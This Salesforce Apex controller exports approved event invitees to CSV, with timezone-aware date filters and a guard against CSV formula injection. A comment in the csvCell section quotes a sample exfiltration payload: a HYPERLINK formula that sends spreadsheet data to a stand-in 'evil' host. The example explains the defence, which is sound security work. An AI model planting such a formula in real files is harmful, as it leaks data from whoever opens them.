/**
 * Export approved invitees as CSV — one event (`exportApproved`) or every event
 * the running user can see (`exportAllApproved`), optionally narrowed to a
 * decision-date range.
 *
 * Both queries include BOTH Approved and Exported rows so re-export always returns
 * the full approved list; first export flips Approved → Exported (Exported_Count__c
 * roll-up keeps the event page honest).
 *
 * Dates: `Decided_At__c` is stored and compared in GMT. The UI hands us plain
 * calendar dates the user picked in their own timezone, so `toLocalDayStart` turns
 * "2026-07-01" into the GMT instant of midnight *in the running user's timezone* —
 * see `windowLabel` on the result for the GMT window actually applied.
 *
 * Rows are emitted with CRLF line endings (RFC 4180) so the downloaded file opens
 * cleanly in desktop Excel; the UTF-8 BOM is added client-side when the Blob is built.
 */
public with sharing class EventExportController {

    /** Hard ceiling so a cross-event export can't blow the heap on a large org. */
    @TestVisible
    private static Integer rowLimit = 10000;

    private static final String CRLF = '\r\n';
    private static final String EVENT_HEADER = 'Event,Event Date,';
    private static final String CONTACT_HEADER = 'Name,Title,Account,Email,Approved By,Decided At';
    private static final String APPROVED_STATUSES = '(\'Approved\', \'Exported\')';
    private static final Set<String> FORMULA_TRIGGERS = new Set<String>{ '=', '+', '-', '@', '\t', '\r' };

    private static final String ROW_FIELDS =
        'Id, Status__c, Decided_At__c, Marketing_Event__c, ' +
        'Marketing_Event__r.Name, Marketing_Event__r.Event_Date__c, ' +
        'Contact__r.Name, Contact__r.Title, Contact__r.Email, ' +
        'Account__r.Name, Account_Owner__r.Name';

    private static final String ROW_ORDER =
        'Marketing_Event__r.Event_Date__c NULLS LAST, Marketing_Event__r.Name, ' +
        'Account__r.Name, Contact__r.Name';

    public class ExportResult {
        @AuraEnabled public String csv { get; set; }
        @AuraEnabled public String fileName { get; set; }
        @AuraEnabled public Integer rowCount { get; set; }
        @AuraEnabled public Integer eventCount { get; set; }
        /** True when the row cap cut the export short — the UI warns instead of silently under-delivering. */
        @AuraEnabled public Boolean truncated { get; set; }
        /** Human-readable description of the decision-date window applied; null when unfiltered. */
        @AuraEnabled public String windowLabel { get; set; }
    }

    /** One line per event on the "download everything" screen. */
    public class ApprovedSummary {
        @AuraEnabled public Id eventId { get; set; }
        @AuraEnabled public String eventName { get; set; }
        @AuraEnabled public Date eventDate { get; set; }
        @AuraEnabled public Integer approvedCount { get; set; }  // not yet downloaded
        @AuraEnabled public Integer exportedCount { get; set; }  // downloaded at least once
        @AuraEnabled public Integer totalCount { get; set; }
    }

    /**
     * Approved/Exported counts per event, for every event the user can see.
     * `mineOnly` restricts to invitees the running user added (their own batch);
     * `fromDate`/`toDate` (inclusive, user-timezone calendar dates, either may be
     * null) restrict to invitees decided in that window.
     */
    @AuraEnabled(cacheable=true)
    public static List<ApprovedSummary> getApprovedSummary(Boolean mineOnly, Date fromDate, Date toDate) {
        Id me = UserInfo.getUserId();
        Datetime fromTs = toLocalDayStart(fromDate);
        Datetime toTs = toLocalDayStart(toDate == null ? null : toDate.addDays(1)); // end-inclusive

        String soql =
            'SELECT Marketing_Event__c evtId, Status__c st, COUNT(Id) cnt ' +
            'FROM Event_Invitee__c ' +
            'WHERE Status__c IN ' + APPROVED_STATUSES +
            (mineOnly == true ? ' AND Added_By__c = :me' : '') +
            (fromTs != null ? ' AND Decided_At__c >= :fromTs' : '') +
            (toTs != null ? ' AND Decided_At__c < :toTs' : '') +
            ' GROUP BY Marketing_Event__c, Status__c';

        Map<Id, ApprovedSummary> byEvent = new Map<Id, ApprovedSummary>();
        for (AggregateResult ar : (List<AggregateResult>) Database.query(soql)) {
            Id evtId = (Id) ar.get('evtId');
            ApprovedSummary s = byEvent.get(evtId);
            if (s == null) {
                s = new ApprovedSummary();
                s.eventId = evtId;
                s.approvedCount = 0;
                s.exportedCount = 0;
                s.totalCount = 0;
                byEvent.put(evtId, s);
            }
            Integer n = (Integer) ar.get('cnt');
            if ((String) ar.get('st') == 'Approved') { s.approvedCount += n; } else { s.exportedCount += n; }
            s.totalCount += n;
        }
        if (byEvent.isEmpty()) { return new List<ApprovedSummary>(); }

        List<ApprovedSummary> out = new List<ApprovedSummary>();
        for (Marketing_Event__c evt : [
            SELECT Id, Name, Event_Date__c
            FROM Marketing_Event__c
            WHERE Id IN :byEvent.keySet()
            ORDER BY Event_Date__c NULLS LAST, Name
        ]) {
            ApprovedSummary s = byEvent.get(evt.Id);
            s.eventName = evt.Name;
            s.eventDate = evt.Event_Date__c;
            out.add(s);
        }
        return out;
    }

    /** Approved list for a single event, optionally narrowed to a decision-date window. */
    @AuraEnabled
    public static ExportResult exportApproved(Id eventId, Date fromDate, Date toDate) {
        Marketing_Event__c evt = [SELECT Id, Name FROM Marketing_Event__c WHERE Id = :eventId];

        List<Event_Invitee__c> rows = queryRows(eventId, false, fromDate, toDate);
        if (rows.isEmpty()) {
            throw new AuraHandledException(emptyMessage(false, fromDate, toDate));
        }

        ExportResult res = build(rows, false);
        res.fileName = slug(evt.Name) + '_approved_contacts' + fileSuffix(fromDate, toDate) + '.csv';
        res.eventCount = 1;
        res.windowLabel = windowLabel(fromDate, toDate);
        return res;
    }

    /**
     * Every approved invitee across every event the user can see, one file.
     * `mineOnly` restricts to invitees the running user added; `fromDate`/`toDate`
     * are inclusive calendar dates in the running user's timezone.
     */
    @AuraEnabled
    public static ExportResult exportAllApproved(Boolean mineOnly, Date fromDate, Date toDate) {
        List<Event_Invitee__c> rows = queryRows(null, mineOnly, fromDate, toDate);
        if (rows.isEmpty()) {
            throw new AuraHandledException(emptyMessage(mineOnly, fromDate, toDate));
        }

        Set<Id> events = new Set<Id>();
        for (Event_Invitee__c inv : rows) { events.add(inv.Marketing_Event__c); }

        ExportResult res = build(rows, true);
        res.fileName = 'all_approved_contacts' + fileSuffix(fromDate, toDate) +
            (fromDate == null && toDate == null ? '_' + Datetime.now().format('yyyyMMdd', 'GMT') : '') + '.csv';
        res.eventCount = events.size();
        res.windowLabel = windowLabel(fromDate, toDate);
        return res;
    }

    /**
     * Single row query behind both exports. Dynamic because the four optional
     * predicates would otherwise need eight hand-written SOQL variants; every
     * user-supplied value is bound, never concatenated.
     */
    private static List<Event_Invitee__c> queryRows(Id eventId, Boolean mineOnly, Date fromDate, Date toDate) {
        Id me = UserInfo.getUserId();
        Integer maxRows = rowLimit;
        Datetime fromTs = toLocalDayStart(fromDate);
        Datetime toTs = toLocalDayStart(toDate == null ? null : toDate.addDays(1)); // end-inclusive

        String soql =
            'SELECT ' + ROW_FIELDS +
            ' FROM Event_Invitee__c' +
            ' WHERE Status__c IN ' + APPROVED_STATUSES +
            (eventId != null ? ' AND Marketing_Event__c = :eventId' : '') +
            (mineOnly == true ? ' AND Added_By__c = :me' : '') +
            (fromTs != null ? ' AND Decided_At__c >= :fromTs' : '') +
            (toTs != null ? ' AND Decided_At__c < :toTs' : '') +
            ' ORDER BY ' + (eventId != null ? 'Account__r.Name, Contact__r.Name' : ROW_ORDER) +
            ' LIMIT :maxRows';
        return (List<Event_Invitee__c>) Database.query(soql);
    }

    /**
     * Midnight of `d` **in the running user's timezone**, as a GMT instant.
     * `Datetime.newInstance(Date, Time)` interprets its arguments in the user's
     * timezone, which is exactly the conversion the date pickers need.
     */
    @TestVisible
    private static Datetime toLocalDayStart(Date d) {
        return d == null ? null : Datetime.newInstance(d, Time.newInstance(0, 0, 0, 0));
    }

    /**
     * Shared CSV writer. Also flips the Approved rows in `rows` to Exported, so a
     * download marks everything it actually delivered.
     */
    private static ExportResult build(List<Event_Invitee__c> rows, Boolean includeEvent) {
        List<String> lines = new List<String>{
            (includeEvent ? EVENT_HEADER : '') + CONTACT_HEADER
        };
        List<Event_Invitee__c> toFlip = new List<Event_Invitee__c>();

        for (Event_Invitee__c inv : rows) {
            List<String> cells = new List<String>();
            if (includeEvent) {
                cells.add(csvCell(inv.Marketing_Event__r != null ? inv.Marketing_Event__r.Name : ''));
                cells.add(csvCell(
                    inv.Marketing_Event__r != null && inv.Marketing_Event__r.Event_Date__c != null
                        ? String.valueOf(inv.Marketing_Event__r.Event_Date__c)
                        : ''));
            }
            cells.add(csvCell(inv.Contact__r.Name));
            cells.add(csvCell(inv.Contact__r.Title));
            cells.add(csvCell(inv.Account__r != null ? inv.Account__r.Name : ''));
            cells.add(csvCell(inv.Contact__r.Email));
            cells.add(csvCell(inv.Account_Owner__r != null ? inv.Account_Owner__r.Name : ''));
            cells.add(csvCell(inv.Decided_At__c != null
                ? inv.Decided_At__c.format('yyyy-MM-dd HH:mm', 'GMT') + ' GMT'
                : ''));
            lines.add(String.join(cells, ','));

            if (inv.Status__c == 'Approved') {
                toFlip.add(new Event_Invitee__c(Id = inv.Id, Status__c = 'Exported'));
            }
        }
        if (!toFlip.isEmpty()) { update toFlip; }

        ExportResult res = new ExportResult();
        res.csv = String.join(lines, CRLF);
        res.rowCount = rows.size();
        res.truncated = (rows.size() == rowLimit);
        return res;
    }

    /**
     * The local window and the GMT window it resolved to. Worth spelling out: the
     * file's Decided At column is GMT, so a user who filtered "1 July" in Taipei
     * would otherwise read the 30 June GMT timestamps as a bug.
     */
    private static String windowLabel(Date fromDate, Date toDate) {
        if (fromDate == null && toDate == null) { return null; }
        String tz = UserInfo.getTimeZone().getID();
        String local = (fromDate == null ? 'anything' : String.valueOf(fromDate)) +
                       ' → ' + (toDate == null ? 'now' : String.valueOf(toDate));
        Datetime fromTs = toLocalDayStart(fromDate);
        Datetime toTs = toLocalDayStart(toDate == null ? null : toDate.addDays(1));
        String gmt = (fromTs == null ? '…' : fromTs.format('yyyy-MM-dd HH:mm', 'GMT')) +
                     ' → ' + (toTs == null ? '…' : toTs.format('yyyy-MM-dd HH:mm', 'GMT'));
        return 'Decided ' + local + ' (' + tz + ') = ' + gmt + ' GMT';
    }

    private static String emptyMessage(Boolean mineOnly, Date fromDate, Date toDate) {
        String whose = (mineOnly == true) ? 'approved invitees of yours' : 'approved invitees';
        return (fromDate == null && toDate == null)
            ? 'No ' + whose + ' to export yet.'
            : 'No ' + whose + ' decided in the selected date range.';
    }

    private static String fileSuffix(Date fromDate, Date toDate) {
        if (fromDate == null && toDate == null) { return ''; }
        return '_' + (fromDate == null ? 'start' : String.valueOf(fromDate)) +
               '_to_' + (toDate == null ? 'now' : String.valueOf(toDate));
    }

    private static String slug(String name) {
        return name.replaceAll('[^a-zA-Z0-9 _-]', '').replace(' ', '_');
    }

    /**
     * Quoting, plus CSV formula injection defence.
     *
     * Every value in the file is Salesforce data an AM can set (a Contact Title, an
     * Account name, an event name) or that arrives through the .csv import, so a cell
     * opening with =, +, - or @ is attacker-controllable. Excel and LibreOffice evaluate
     * such a cell on open — `=HYPERLINK("http://evil/?d="&A1,"Invoice")` exfiltrates the
     * neighbouring row on a single click, and DDE payloads go further. Prefixing with an
     * apostrophe forces the spreadsheet to read the value as text; the cell is then always
     * quoted so the apostrophe cannot be confused with a delimiter.
     *
     * Trade-off: the apostrophe is visible in some spreadsheet/import combinations. That
     * is acceptable here because every exported column is text (names, titles, emails,
     * formatted timestamps) — no legitimate value is a negative number that would be
     * damaged by the guard.
     */
    @TestVisible
    private static String csvCell(String value) {
        if (value == null) { return ''; }
        Boolean guarded = isFormulaLike(value);
        String safe = guarded ? '\'' + value : value;
        if (guarded || safe.contains(',') || safe.contains('"') || safe.contains('\n') || safe.contains('\r')) {
            return '"' + safe.replace('"', '""') + '"';
        }
        return safe;
    }

    /**
     * Leading characters a spreadsheet treats as the start of a formula. Tab and CR are
     * included because Excel skips them before parsing what follows.
     */
    private static Boolean isFormulaLike(String value) {
        if (String.isEmpty(value)) { return false; }
        return FORMULA_TRIGGERS.contains(value.substring(0, 1));
    }
}
